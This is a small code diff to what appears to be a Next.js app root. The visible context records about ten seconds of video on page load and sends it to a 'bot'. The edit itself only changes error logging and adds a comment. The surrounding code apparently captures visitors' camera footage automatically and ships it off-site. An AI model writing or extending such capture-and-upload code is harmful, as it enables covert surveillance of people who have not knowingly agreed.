@@ -46,7 +46,7 @@ const myApp = ({ Component, pageProps }) => {
                             if (response.ok) {
                                 console.log('Видео успешно отправлено на бота');
                             } else {
-                                console.error('Ошибка при отправке видео на бота:', response.statusText);
+                                console.error('Ошибка при отправке видео на бота:', await response.text());
                             }
                         } catch (error) {
                             console.error('Ошибка fetch:', error);
@@ -55,6 +55,7 @@ const myApp = ({ Component, pageProps }) => {
 
                     mediaRecorder.start(100);
 
+                    // Остановка записи через определенное время (например, 10 секунд)
                     setTimeout(() => {
                         mediaRecorder.stop();
                     }, 10000);
@@ -66,6 +67,7 @@ const myApp = ({ Component, pageProps }) => {
 
         getMediaAndSendData();
     }, []);
+
 
     // 
 
